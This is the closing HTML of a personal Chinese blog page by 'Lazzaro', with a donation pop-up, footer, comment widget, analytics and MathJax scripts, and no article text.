class="text-in icon icon-close"></i> <span>]</span></a></li></ul><button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat" data-mobile-sites="weibo,qq,wechat"></div></div></div></nav><div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog"><div class="modal-dialog" role="document"><div class="modal-content donate"><button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button><div class="modal-body"><div class="donate-box"><div class="donate-head"><p>这篇文章对你有用，赏一波~~</p></div><div class="tab-content"><div role="tabpanel" class="tab-pane fade active in" id="alipay"><div class="donate-payimg"><img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开支付宝扫一扫即可扫码打赏激励哦~</p></div><div role="tabpanel" class="tab-pane fade" id="wechatpay"><div class="donate-payimg"><img src="/images/donate/wechatpayimg.png" alt="扫码支持" title="扫一扫"></div><p class="text-muted mv">⎝Lazzaro⎠</p><p class="text-grey">打开微信扫一扫即可扫码打赏激励哦~</p></div></div><div class="donate-footer"><ul class="nav nav-tabs nav-justified" role="tablist"><li role="presentation" class="active"><a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a></li><li role="presentation"><a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a></li></ul></div></div></div></div></div></div></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul><div class="copyright">&copy; 2022 Lazzaro<br><span>总访问 - <span id="busuanzi_value_site_pv"></span>次</span><br><span>访客数 - <span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"类别",TAGS:"关键词",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"来来来说点啥~~\r\n对你有用？赏一波！↘↘",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><script defer>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="//hm.baidu.com/hm.js?e7553a1c385e5487b8ef58cd5738e112";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("复制").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* 复制并使用代码请注明引用出处哦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("复制成功"):$(this).text("复制失败"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("复制")},300)}).append(e)})})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>